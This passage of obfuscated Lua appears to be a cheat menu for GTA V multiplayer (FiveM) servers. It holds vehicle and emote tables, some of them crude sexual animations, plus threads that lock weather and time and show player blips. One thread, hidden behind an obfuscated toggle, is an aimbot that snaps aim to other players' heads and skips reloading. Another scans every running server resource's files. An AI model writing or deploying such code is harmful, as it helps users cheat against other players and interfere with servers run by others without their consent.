'ESSKEY', 'FAGGIO', 'FAGGIO2', 'FAGGIO3', 'FCR', 'FCR2', 'GARGOYLE', 'HAKUCHOU', 'HAKUCHOU2', 'HEXER', 'INNOVATION', 'LECTRO', 'MANCHEZ', 'NEMESIS', 'NIGHTBLADE', 'OPPRESSOR', 'OPPRESSOR2', 'PCJ', 'RATBIKE', 'RUFFIAN', 'SANCHEZ', 'SANCHEZ2', 'SANCTUS', 'SHOTARO', 'SOVEREIGN', 'THRUST', 'VADER', 'VINDICATOR', 'VORTEX', 'WOLFSBANE', 'ZOMBIEA', 'ZOMBIEB' }, ['utility'] = { 'AIRTUG', 'CADDY', 'CADDY2', 'CADDY3', 'DOCKTUG', 'FORKLIFT', 'TRACTOR2', 'TRACTOR3', 'MOWER', 'RIPLEY', 'SADLER', 'SADLER2', 'SCRAP', 'TOWTRUCK', 'TOWTRUCK2', 'TRACTOR', 'UTILLITRUCK', 'UTILLITRUCK2', 'UTILLITRUCK3', 'ARMYTRAILER', 'ARMYTRAILER2', 'FREIGHTTRAILER', 'ARMYTANKER', 'TRAILERLARGE', 'DOCKTRAILER', 'TR3', 'TR2', 'TR4', 'TRFLAT', 'TRAILERS', 'TRAILERS4', 'TRAILERS2', 'TRAILERS3', 'TVTRAILER', 'TRAILERLOGS', 'TANKER', 'TANKER2', 'BALETRAILER', 'GRAINTRAILER', 'BOATTRAILER', 'RAKETRAILER', 'TRAILERSMALL' }, ['commercial'] = { 'BENSON', 'BIFF', 'CERBERUS', 'CERBERUS2', 'CERBERUS3', 'HAULER', 'HAULER2', 'MULE', 'MULE2', 'MULE3', 'MULE4', 'PACKER', 'PHANTOM', 'PHANTOM2', 'PHANTOM3', 'POUNDER', 'POUNDER2', 'STOCKADE', 'STOCKADE3', 'TERBYTE', 'CABLECAR', 'FREIGHT', 'FREIGHTCAR', 'FREIGHTCONT1', 'FREIGHTCONT2', 'FREIGHTGRAIN', 'METROTRAIN', 'TANKERCAR' }, ['super'] = { 'ADDER', 'AUTARCH', 'BANSHEE2', 'BULLET', 'CHEETAH', 'CYCLONE', 'DEVESTE', 'ENTITYXF', 'ENTITY2', 'FMJ', 'GP1', 'INFERNUS', 'ITALIGTB', 'ITALIGTB2', 'LE7B', 'NERO', 'NERO2', 'OSIRIS', 'PENETRATOR', 'PFISTER811', 'PROTOTIPO', 'REAPER', 'SC1', 'SCRAMJET', 'SHEAVA', 'SULTANRS', 'T20', 'TAIPAN', 'TEMPESTA', 'TEZERACT', 'TURISMOR', 'TYRANT', 'TYRUS', 'VACCA', 'VAGNER', 'VIGILANTE', 'VISIONE', 'VOLTIC', 'VOLTIC2', 'XA21', 'ZENTORNO' }, ['planes'] = { 'ALPHAZ1', 'AVENGER', 'AVENGER2', 'BESRA', 'BLIMP', 'BLIMP2', 'BLIMP3', 'BOMBUSHKA', 'CARGOPLANE', 'CUBAN800', 'DODO', 'DUSTER', 'HOWARD', 'HYDRA', 'JET', 'LAZER', 'LUXOR', 'LUXOR2', 'MAMMATUS', 'MICROLIGHT', 'MILJET', 'MOGUL', 'MOLOTOK', 'NIMBUS', 'NOKOTA', 'PYRO', 'ROGUE', 'SEABREEZE', 'SHAMAL', 'STARLING', 'STRIKEFORCE', 'STUNT', 'TITAN', 'TULA', 'VELUM', 'VELUM2', 'VESTRA', 'VOLATOL' }, ['coupes'] = { 'COGCABRIO', 'EXEMPLAR', 'F620', 'FELON', 'FELON2', 'JACKAL', 'ORACLE', 'ORACLE2', 'SENTINEL', 'SENTINEL2', 'WINDSOR', 'WINDSOR2', 'ZION', 'ZION2' }, ['vans'] = { 'BISON', 'BISON2', 'BISON3', 'BOBCATXL', 'BOXVILLE', 'BOXVILLE2', 'BOXVILLE3', 'BOXVILLE4', 'BOXVILLE5', 'BURRITO', 'BURRITO2', 'BURRITO3', 'BURRITO4', 'BURRITO5', 'CAMPER', 'GBURRITO', 'GBURRITO2', 'JOURNEY', 'MINIVAN', 'MINIVAN2', 'PARADISE', 'PONY', 'PONY2', 'RUMPO', 'RUMPO2', 'RUMPO3', 'SPEEDO', 'SPEEDO2', 'SPEEDO4', 'SURFER', 'SURFER2', 'TACO', 'YOUGA', 'YOUGA2' }, ['service'] = { 'AIRBUS', 'BRICKADE', 'BUS', 'COACH', 'PBUS2', 'RALLYTRUCK', 'RENTALBUS', 'TAXI', 'TOURBUS', 'TRASH', 'TRASH2', 'WASTELANDER', 'AMBULANCE', 'FBI', 'FBI2', 'FIRETRUK', 'LGUARD', 'PBUS', 'POLICE', 'POLICE2', 'POLICE3', 'POLICE4', 'POLICEB', 'POLICEOLD1', 'POLICEOLD2', 'POLICET', 'POLMAV', 'PRANGER', 'PREDATOR', 'RIOT', 'RIOT2', 'SHERIFF', 'SHERIFF2', 'APC', 'BARRACKS', 'BARRACKS2', 'BARRACKS3', 'BARRAGE', 'CHERNOBOG', 'CRUSADER', 'HALFTRACK', 'KHANJALI', 'RHINO', 'SCARAB', 'SCARAB2', 'SCARAB3', 'THRUSTER', 'TRAILERSMALL2' }, ['suvs'] = { 'BALLER', 'BALLER2', 'BALLER3', 'BALLER4', 'BALLER5', 'BALLER6', 'BJXL', 'CAVALCADE', 'CAVALCADE2', 'CONTENDER', 'DUBSTA', 'DUBSTA2', 'FQ2', 'GRANGER', 'GRESLEY', 'HABANERO', 'HUNTLEY', 'LANDSTALKER', 'MESA', 'MESA2', 'PATRIOT', 'PATRIOT2', 'RADI', 'ROCOTO', 'SEMINOLE', 'SERRANO', 'TOROS', 'XLS', 'XLS2' }, ['industrial'] = { 'BULLDOZER', 'CUTTER', 'DUMP', 'FLATBED', 'GUARDIAN', 'HANDLER', 'MIXER', 'MIXER2', 'RUBBLE', 'TIPTRUCK', 'TIPTRUCK2' }, ['helicopters'] = { 'AKULA', 'ANNIHILATOR', 'BUZZARD', 'BUZZARD2', 'CARGOBOB', 'CARGOBOB2', 'CARGOBOB3', 'CARGOBOB4', 'FROGGER', 'FROGGER2', 'HAVOK', 'HUNTER', 'MAVERICK', 'POLMAV', 'SAVAGE', 'SEASPARROW', 'SKYLIFT', 'SUPERVOLITO', 'SUPERVOLITO2', 'SWIFT', 'SWIFT2', 'VALKYRIE', 'VALKYRIE2', 'VOLATUS' }, ['boats'] = { 'DINGHY', 'DINGHY2', 'DINGHY3', 'DINGHY4', 'JETMAX', 'MARQUIS', 'PREDATOR', 'SEASHARK', 'SEASHARK2', 'SEASHARK3', 'SPEEDER', 'SPEEDER2', 'SQUALO', 'SUBMERSIBLE', 'SUBMERSIBLE2', 'SUNTRAP', 'TORO', 'TORO2', 'TROPIC', 'TROPIC2', 'TUG' }, ['sedans'] = { 'ASEA', 'ASEA2', 'ASTEROPE', 'COG55', 'COG552', 'COGNOSCENTI', 'COGNOSCENTI2', 'EMPEROR', 'EMPEROR2', 'EMPEROR3', 'FUGITIVE', 'GLENDALE', 'INGOT', 'INTRUDER', 'LIMO2', 'PREMIER', 'PRIMO', 'PRIMO2', 'REGINA', 'ROMERO', 'SCHAFTER2', 'SCHAFTER5', 'SCHAFTER6', 'STAFFORD', 'STANIER', 'STRATUM', 'STRETCH', 'SUPERD', 'SURGE', 'TAILGATER', 'WARRENER', 'WASHINGTON' }, ['muscle'] = { 'BLADE', 'BUCCANEER', 'BUCCANEER2', 'CHINO', 'CHINO2', 'CLIQUE', 'COQUETTE3', 'DEVIANT', 'DOMINATOR', 'DOMINATOR2', 'DOMINATOR3', 'DOMINATOR4', 'DOMINATOR5', 'DOMINATOR6', 'DUKES', 'DUKES2', 'ELLIE', 'FACTION', 'FACTION2', 'FACTION3', 'GAUNTLET', 'GAUNTLET2', 'HERMES', 'HOTKNIFE', 'HUSTLER', 'IMPALER', 'IMPALER2', 'IMPALER3', 'IMPALER4', 'IMPERATOR', 'IMPERATOR2', 'IMPERATOR3', 'LURCHER', 'MOONBEAM', 'MOONBEAM2', 'NIGHTSHADE', 'PHOENIX', 'PICADOR', 'RATLOADER', 'RATLOADER2', 'RUINER', 'RUINER2', 'RUINER3', 'SABREGT', 'SABREGT2', 'SLAMVAN', 'SLAMVAN2', 'SLAMVAN3', 'SLAMVAN4', 'SLAMVAN5', 'SLAMVAN6', 'STALION', 'STALION2', 'TAMPA', 'TAMPA3', 'TULIP', 'VAMOS', 'VIGERO', 'VIRGO', 'VIRGO2', 'VIRGO3', 'VOODOO', 'VOODOO2', 'YOSEMITE' } }
local c_ = function()
    for F, G in pairs(p) do
        table.insert(Z[17], { ['Text'] = F, ['Type'] = 'list', ['Items'] = G, ['Current'] = 1, ['cb'] = cc })
    end
    table.insert(Z[17], { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 12 })
end
local d0 = function()
    while true do
        if d['Lock time'] then
            NetworkOverrideClockTime(x, 0, 0)
        end
        if d['Lock weather'] then
            ClearOverrideWeather()
            ClearWeatherTypePersist()
            SetWeatherTypePersist(w)
            SetWeatherTypeNow(w)
            SetWeatherTypeNowPersist(w)
            if w == 'XMAS' then
                SetForceVehicleTrails(true)
                SetForcePedFootstepsTracks(true)
            else
                SetForceVehicleTrails(false)
                SetForcePedFootstepsTracks(false)
            end
        end
        Wait(0)
    end
end
local d1 = function()
    while true do
        if d['PlayerBlips'] then
            ch({ ['Enabled'] = d['PlayerBlips'] })
        end
        Wait(10000)
    end
end
local d2 = function()
    while true do
        local bo, bG = 250, PlayerPedId()
        if d['§þïñßð†'] then
            bo = 0
            if IsPedArmed(bG, 6) then
                for F, G in pairs(o) do
                    Wait(0)
                    local d3 = GetPlayerPed(G)
                    if DoesEntityExist(d3) and d3 ~= bG then
                        if not IsPedDeadOrDying(d3) and not IsPedFatallyInjured(d3) then
                            local d4 = GetEntityCoords(d3)
                            local a7, d5, d6 = World3dToScreen2d(d4.x, d4.y, d4.z, 0)
                            if IsEntityVisible(d3) and a7 and HasEntityClearLosToEntity(bG, d3, 17) then
                                aR(GetPedBoneCoords(d3, 31086, 0, 0, 0))
                                PedSkipNextReloading(bG)
                            end
                        end
                    end
                end
            end
        end
        Wait(bo)
    end
end
local d7 = function()
    while true do
        local bo = 250
        if d['Show toggles'] then
            bo = 0
            local d8 = 0.0
            for F, G in pairs(d) do
                if G then
                    if F ~= 'Show toggles' then
                        if type(G) ~= 'boolean' then
                            ar(F .. ' [' .. G .. ']', 0.0 + d8, true, nil, 0.25, 0.9, false, 0.1)
                        else
                            ar(F, 0.0 + d8, true, nil, 0.25, 0.9, false, 0.1)
                        end
                        d8 = d8 + 0.015
                    end
                end
            end
        end
        Wait(bo)
    end
end
A = { ["Smoke"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_SMOKING" }, ["Musician"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_MUSICIAN" }, ["Dj"] = { ["Type"] = "animation", ["Dict"] = "anim@mp_player_intcelebrationmale@dj", ["Anim"] = "dj", ["Flag"] = 0 }, ["Coffee"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_DRINKING" }, ["Beer"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_PARTYING" }, ["Air Guitar"] = { ["Type"] = "animation", ["Dict"] = "anim@mp_player_intcelebrationmale@air_guitar", ["Anim"] = "air_guitar", ["Flag"] = 0 }, ["Air Shagging"] = { ["Type"] = "animation", ["Dict"] = "anim@mp_player_intcelebrationfemale@air_shagging", ["Anim"] = "air_shagging", ["Flag"] = 0 }, ["Rock'n'roll"] = { ["Type"] = "animation", ["Dict"] = "mp_player_int_upperrock", ["Anim"] = "mp_player_int_rock", ["Flag"] = 0 }, ["Drunk Standing"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_bum_standing@drunk@idle_a", ["Anim"] = "idle_a", ["Flag"] = 0 }, ["Vomiting"] = { ["Type"] = "animation", ["Dict"] = "oddjobs@taxi@tie", ["Anim"] = "vomit_outside", ["Flag"] = 0 }, ["Hello"] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_hello", ["Flag"] = 0 }, ["Wave"] = { ["Type"] = "animation", ["Dict"] = "mp_common", ["Anim"] = "givetake1_a", ["Flag"] = 0 }, ["Handshake"] = { ["Type"] = "animation", ["Dict"] = "mp_ped_interaction", ["Anim"] = "handshake_guy_a", ["Flag"] = 0 }, ["Hugging"] = { ["Type"] = "animation", ["Dict"] = "mp_ped_interaction", ["Anim"] = "hugs_guy_a", ["Flag"] = 0 }, ["Salute"] = { ["Type"] = "animation", ["Dict"] = "mp_player_int_uppersalute", ["Anim"] = "mp_player_int_salute", ["Flag"] = 0 }, ["Suspect : Surrender"] = { ["Type"] = "animation", ["Dict"] = "random@arrests@busted", ["Anim"] = "idle_c", ["Flag"] = 0 }, ["Fishing"] = { ["Type"] = "scenario", ["Anim"] = "world_human_stand_fishing" }, ["Police : Investigate"] = { ["Type"] = "animation", ["Dict"] = "amb@code_human_police_investigate@idle_b", ["Anim"] = "idle_f", ["Flag"] = 0 }, ["Police : Use Radio"] = { ["Type"] = "animation", ["Dict"] = "random@arrests", ["Anim"] = "generic_radio_chatter", ["Flag"] = 0 }, ["Police : Traffic"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_CAR_PARK_ATTENDANT" }, ["Police : Binoculars"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_BINOCULARS" }, ["Agriculture : Planting"] = { ["Type"] = "scenario", ["Anim"] = "world_human_gardener_plant" }, ["Mechanic : Fixing Motor"] = { ["Type"] = "animation", ["Dict"] = "mini@repair", ["Anim"] = "fixing_a_ped", ["Flag"] = 0 }, ["Medic : Kneel"] = { ["Type"] = "scenario", ["Anim"] = "CODE_HUMAN_MEDIC_KNEEL" }, ["Taxi : Talk to customer"] = { ["Type"] = "animation", ["Dict"] = "oddjobs@taxi@driver", ["Anim"] = "leanover_idle", ["Flag"] = 0 }, ["Taxi : Give bill"] = { ["Type"] = "animation", ["Dict"] = "oddjobs@taxi@cyi", ["Anim"] = "std_hand_off_ps_passenger", ["Flag"] = 0 }, ["Grocer : Give"] = { ["Type"] = "animation", ["Dict"] = "mp_am_hold_up", ["Anim"] = "purchase_beerbox_shopkeeper", ["Flag"] = 0 }, ["Barman : Serve Shot"] = { ["Type"] = "animation", ["Dict"] = "mini@drinking", ["Anim"] = "shots_barman_b", ["Flag"] = 0 }, ["Journalist : Take Photos"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_PAPARAZZI" }, ["All Jobs : Clipboard"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_CLIPBOARD" }, ["All Jobs : Hammering"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_HAMMERING" }, ["Bum : Holding Sign"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_BUM_FREEWAY" }, ["Bum : Human Statue"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_HUMAN_STATUE" }, ["Cheering"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_CHEERING" }, ["Super"] = { ["Type"] = "animation", ["Dict"] = "mp_action", ["Anim"] = "thanks_male_06", ["Flag"] = 0 }, ["Point"] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_point", ["Flag"] = 0 }, ["Come here"] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_come_here_soft", ["Flag"] = 0 }, ["Bring it on"] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_bring_it_on", ["Flag"] = 0 }, ["Me"] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_me", ["Flag"] = 0 }, ["I knew it"] = { ["Type"] = "animation", ["Dict"] = "anim@am_hold_up@male", ["Anim"] = "shoplift_high", ["Flag"] = 0 }, ["Exhausted"] = { ["Type"] = "scenario", ["Anim"] = "idle_d" }, ["I'm the shit"] = { ["Type"] = "scenario", ["Anim"] = "idle_a" }, ["Facepalm"] = { ["Type"] = "animation", ["Dict"] = "anim@mp_player_intcelebrationmale@face_palm", ["Anim"] = "face_palm", ["Flag"] = 0 }, ["Calm down "] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_easy_now", ["Flag"] = 0 }, ["What did I do?"] = { ["Type"] = "animation", ["Dict"] = "oddjobs@assassinate@multi@", ["Anim"] = "react_big_variations_a", ["Flag"] = 0 }, ["Fear"] = { ["Type"] = "animation", ["Dict"] = "amb@code_human_cower_stand@male@react_cowering", ["Anim"] = "base_right", ["Flag"] = 0 }, ["Fight ?"] = { ["Type"] = "animation", ["Dict"] = "anim@deathmatch_intros@unarmed", ["Anim"] = "intro_male_unarmed_e", ["Flag"] = 0 }, ["It's not possible !"] = { ["Type"] = "animation", ["Dict"] = "gestures@m@standing@casual", ["Anim"] = "gesture_damn", ["Flag"] = 0 }, ["Embrace"] = { ["Type"] = "animation", ["Dict"] = "mp_ped_interaction", ["Anim"] = "kisses_guy_a", ["Flag"] = 0 }, ["Finger of honor"] = { ["Type"] = "animation", ["Dict"] = "mp_player_int_upperfinger", ["Anim"] = "mp_player_int_finger_01_enter", ["Flag"] = 0 }, ["You wanker"] = { ["Type"] = "animation", ["Dict"] = "mp_player_int_upperwank", ["Anim"] = "mp_player_int_wank_01", ["Flag"] = 0 }, ["Bullet in the head"] = { ["Type"] = "animation", ["Dict"] = "mp_suicide", ["Anim"] = "pistol", ["Flag"] = 0 }, ["Flex muscles"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_muscle_flex@arms_at_side@base", ["Anim"] = "base", ["Flag"] = 0 }, ["Lift weights"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_muscle_free_weights@male@barbell@base", ["Anim"] = "base", ["Flag"] = 0 }, ["Do push ups"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_push_ups@male@base", ["Anim"] = "base", ["Flag"] = 0 }, ["Do sit ups"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_sit_ups@male@base", ["Anim"] = "base", ["Flag"] = 0 }, ["Do yoga"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_yoga@male@base", ["Anim"] = "base_a", ["Flag"] = 0 }, ["Drink coffee"] = { ["Type"] = "animation", ["Dict"] = "amb@world_human_aa_coffee@idle_a", ["Anim"] = "idle_a", ["Flag"] = 0 }, ["Sit"] = { ["Type"] = "animation", ["Dict"] = "anim@heists@prison_heistunfinished_biztarget_idle", ["Anim"] = "target_idle", ["Flag"] = 0 }, ["Lean against wall"] = { ["Type"] = "scenario", ["Anim"] = "world_human_leaning" }, ["Sunbathe Back"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_SUNBATHE_BACK" }, ["Sunbathe Front"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_SUNBATHE" }, ["Clean"] = { ["Type"] = "scenario", ["Anim"] = "world_human_maid_clean" }, ["BBQ"] = { ["Type"] = "scenario", ["Anim"] = "PROP_HUMAN_BBQ" }, ["Search"] = { ["Type"] = "animation", ["Dict"] = "mini@prostitutes@sexlow_veh", ["Anim"] = "low_car_bj_to_prop_female", ["Flag"] = 0 }, ["Take selfie"] = { ["Type"] = "scenario", ["Anim"] = "world_human_tourist_mobile" }, ["Listen to wall/door"] = { ["Type"] = "animation", ["Dict"] = "mini@safe_cracking", ["Anim"] = "idle_base", ["Flag"] = 0 }, ["Normal M"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@confident" }, ["Normal F"] = { ["Type"] = "walking_style", ["Anim"] = "move_f@heels@c" }, ["Depressed male"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@depressed@a" }, ["Depressed female"] = { ["Type"] = "walking_style", ["Anim"] = "move_f@depressed@a" }, ["Business"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@business@a" }, ["Determined"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@brave@a" }, ["Casual"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@casual@a" }, ["Ate too much"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@fat@a" }, ["Hipster"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@hipster@a" }, ["Injured"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@injured" }, ["In a hurry"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@hurry@a" }, ["Hobo"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@hobo@a" }, ["sad"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@sad@a" }, ["Muscle"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@muscle@a" }, ["Shocked"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@shocked@a" }, ["Being shady"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@shadyped@a" }, ["Buzzed"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@buzzed" }, ["Hurry"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@hurry_butch@a" }, ["Proud"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@money" }, ["Short race"] = { ["Type"] = "walking_style", ["Anim"] = "move_m@quick" }, ["Man eater"] = { ["Type"] = "walking_style", ["Anim"] = "move_f@maneater" }, ["Sassy"] = { ["Type"] = "walking_style", ["Anim"] = "move_f@sassy" }, ["Arrogant"] = { ["Type"] = "walking_style", ["Anim"] = "move_f@arrogant@a" }, ["Man receiving in car"] = { ["Type"] = "animation", ["Dict"] = "oddjobs@towing", ["Anim"] = "m_blow_job_loop", ["Flag"] = 0 }, ["Woman giving in car"] = { ["Type"] = "animation", ["Dict"] = "oddjobs@towing", ["Anim"] = "f_blow_job_loop", ["Flag"] = 0 }, ["Man on bottom in car"] = { ["Type"] = "animation", ["Dict"] = "mini@prostitutes@sexlow_veh", ["Anim"] = "low_car_sex_loop_player", ["Flag"] = 0 }, ["Woman on top in car"] = { ["Type"] = "animation", ["Dict"] = "mini@prostitutes@sexlow_veh", ["Anim"] = "low_car_sex_loop_female", ["Flag"] = 0 }, ["Scratch nuts"] = { ["Type"] = "animation", ["Dict"] = "mp_player_int_uppergrab_crotch", ["Anim"] = "mp_player_int_grab_crotch", ["Flag"] = 0 }, ["Hooker 1"] = { ["Type"] = "animation", ["Dict"] = "mini@strip_club@idles@stripper", ["Anim"] = "stripper_idle_02", ["Flag"] = 0 }, ["Hooker 2"] = { ["Type"] = "scenario", ["Anim"] = "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS" }, ["Hooker 3"] = { ["Type"] = "animation", ["Dict"] = "mini@strip_club@backroom@", ["Anim"] = "stripper_b_backroom_idle_b", ["Flag"] = 0 }, ["Strip Tease 1"] = { ["Type"] = "animation", ["Dict"] = "mini@strip_club@lap_dance@ld_girl_a_song_a_p1", ["Anim"] = "ld_girl_a_song_a_p1_f", ["Flag"] = 0 }, ["Strip Tease 2"] = { ["Type"] = "animation", ["Dict"] = "mini@strip_club@private_dance@part2", ["Anim"] = "priv_dance_p2", ["Flag"] = 0 }, ["Stip Tease On Knees"] = { ["Type"] = "animation", ["Dict"] = "mini@strip_club@private_dance@part3", ["Anim"] = "priv_dance_p3", ["Flag"] = 0 } }
CreateThread(function()
    r = {}
    local d9 = { '__resource.lua', 'fxmanifest.lua' }
    local da = function(db, dc)
        local Q = db:match(".*" .. dc .. "()")
        if Q == nil then
            return nil
        else
            return Q - 1
        end
    end
    for Q = 0, GetNumResources() - 1 do
        if GetResourceState(GetResourceByFindIndex(Q)) == 'started' then
            for F, G in pairs(d9) do
                local as = LoadResourceFile(GetResourceByFindIndex(Q), G)
                if as then
                    if string.find(as:lower(), ('InteractSound by Scott'):lower(), 1, true) then
                        for dd in as:gmatch("[^\r\n]+") do
                            local de, df = dd:find('.ogg')
                            if de and df then
                                if not dd:find('--', 1, true) then
                                    as = dd:sub(da(dd, '/'), de)
                                    print('Found interactsound: ^1' .. as:sub(2, #as - 1))
                                    table.insert(r, as:sub(2, #as - 1))
                                    c = true
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    if #r == 0 then
        r = { 'no sounds' }
    else
        for F, G in pairs(Z) do
            for F, G in pairs(G) do
                if G['Text'] == 'Play on all' or G['Text'] == 'Play sound on player' then
                    G['Items'] = r
                end
            end
        end
    end
end)
local dg = function()
    local dh = GetDuiHandle(CreateDui('https://cdn.discordapp.com/attachments/640650396968157185/724758947281633321/A_Mock-up.jpg', 2000, 1157))
    CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd('wave'), 'logo', dh)
    PlaySoundFromEntity(-1, 'VEHICLE_WATER_SPLASH_HEAVY_SCRIPT', PlayerPedId(), 0, 0, 0)
    for Q = 1, 255 / 3 do
        local di = math.floor(Q * 3)
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, di)
        Wait(0)
    end
    local T = GetGameTimer() + 150
    while T >= GetGameTimer() do
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, 255)
        Wait(0)
    end
    local dj = false
    for Q = 1, 255 / 2 do
        if not z and not dj then
            AddTextEntry(GetCurrentResourceName(), '~INPUT_VEH_FLY_ATTACK_CAMERA~ Open menu')
            DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
        else
            dj = true
        end
        local di = math.floor(255 - Q * 2)
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, di)
        Wait(0)
    end
    while not z and not dj do
        AddTextEntry(GetCurrentResourceName(), '~INPUT_VEH_FLY_ATTACK_CAMERA~ Open menu')
        DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
        Wait(0)
    end
    StopSound()
end
CreateThread(c_)
CreateThread(cK)
CreateThread(dg)
CreateThread(bm)
CreateThread(cY)
CreateThread(cZ)
CreateThread(cg)
CreateThread(d0)
CreateThread(d1)
CreateThread(d2)
CreateThread(d7)
